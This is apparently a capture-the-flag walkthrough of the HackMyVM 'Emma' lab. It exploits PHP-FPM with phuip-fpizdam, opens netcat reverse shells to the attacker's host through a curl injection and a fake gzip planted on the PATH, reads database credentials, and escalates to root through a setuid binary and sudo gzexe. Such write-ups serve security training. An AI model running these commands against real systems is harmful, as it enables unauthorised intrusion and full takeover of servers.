# Emma - HackMyVM walkthrough

## Directory scan
```console
┌──(alienum㉿kali)-[~]
└─$ dirb http://10.0.2.171                                                                                    1 ⚙
---- Scanning URL: http://10.0.2.171/ ----
+ http://10.0.2.171/index.php (CODE:200|SIZE:0)                                                                  
+ http://10.0.2.171/phpinfo.php (CODE:200|SIZE:58765)                                                            
+ http://10.0.2.171/robots.txt (CODE:200|SIZE:15)  
```
## Reading robots.txt
```console
┌──(alienum㉿kali)-[~]
└─$ curl http://10.0.2.171/robots.txt                                               
itwasonlyakiss
```
## Set up golang
- sudo apt-get install golang
- go get github.com/neex/phuip-fpizdam
- export PATH=$PATH:$(go env GOPATH)/bin
## Run the script
```console
┌──(alienum㉿kali)-[~]
└─$ phuip-fpizdam http://10.0.2.171/index.php                                                                 1 ⨯
2021/02/07 13:48:59 Base status code is 200
2021/02/07 13:48:59 Status code 502 for qsl=1770, adding as a candidate
2021/02/07 13:48:59 The target is probably vulnerable. Possible QSLs: [1760 1765 1770]
2021/02/07 13:48:59 Attack params found: --qsl 1760 --pisos 42 --skip-detect
2021/02/07 13:48:59 Trying to set "session.auto_start=0"...
2021/02/07 13:48:59 Detect() returned attack params: --qsl 1760 --pisos 42 --skip-detect <-- REMEMBER THIS
2021/02/07 13:48:59 Performing attack using php.ini settings...
2021/02/07 13:48:59 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
2021/02/07 13:48:59 Trying to cleanup /tmp/a...
2021/02/07 13:48:59 Done!
```
## Reverse shell
[curl]
```console
┌──(alienum㉿kali)-[~]
└─$ curl http://10.0.2.171/index.php?a=/bin/sh+-c+'id;nc -e /bin/sh 10.0.2.15 4444'&
```
[listener]
```console
┌──(alienum㉿kali)-[~]
└─$ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from 10.0.2.171 [10.0.2.171] 43972
/usr/bin/script -qc /bin/bash /dev/null
www-data@emma:~/html$
```
## Found emma's ssh credentials
```console
www-data@emma:~$ cat /etc/passwd
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
```
[mysql root login]
```console
www-data@emma:~$ mysql -u root -pitwasonlyakiss
MariaDB [(none)]> show schemas;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| users              |
+--------------------+
MariaDB [(none)]> use users;
MariaDB [users]> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
MariaDB [users]> select * from users;
+----+------+----------------------------------+
| id | user | pass                             |
+----+------+----------------------------------+
|  1 | emma | 5f****************************** |
+----+------+----------------------------------+
1 row in set (0.000 sec)
```
## Emma ssh login
```console
┌──(alienum㉿kali)-[~]
└─$ ssh emma@10.0.2.171        
emma@10.0.2.171's password: 5f******************************
```
## Privileges Escalation
```console
emma@emma:~$ sudo -l
Matching Defaults entries for emma on emma:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User emma may run the following commands on emma:
    (ALL : ALL) NOPASSWD: /usr/bin/gzexe
emma@emma:~$ ls
flag.sh  user.txt  who  who.c
emma@emma:~$ ./who
Im 
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(emma)
But now Im 
uid=1000(emma) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(emma)
emma@emma:~$ stat who
  File: who
  Size: 16760           Blocks: 40         IO Block: 4096   regular file
Device: 801h/2049d      Inode: 146490      Links: 1
Access: (6750/-rwsr-s---)  Uid: (    0/    root)   Gid: ( 1000/    emma)
```
## 
```console
emma@emma:~$ cat who.c
#include <stdio.h>
#include <stdlib.h>
void main(){
setuid(0);
setgid(0);
printf("Im \n");
system("/bin/id");
setuid(1000);
setgid(1000);
printf("But now Im \n");
system("/bin/id");
}

emma@emma:~$ sudo -u root /usr/bin/gzexe /bin/id
/bin/id:         59.2%
emma@emma:~$ cd /tmp
emma@emma:/tmp$ echo "nc -e /bin/sh 10.0.2.15 4444" > gzip
emma@emma:/tmp$ chmod +x gzip
emma@emma:/tmp$ export PATH=/tmp:$PATH
emma@emma:/tmp$ cd
emma@emma:~$ ./who
Im 
(UNKNOWN) [10.0.2.15] 4444 (?) : Connection refused
Cannot decompress /usr/bin/id

```
[listener]
```console
┌──(alienum㉿kali)-[~]
└─$ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from 10.0.2.171 [10.0.2.171] 43986
id
whoami
root
ls
flag.sh
user.txt
who
who.c
cd /root
ls
flag.sh
root.txt
```
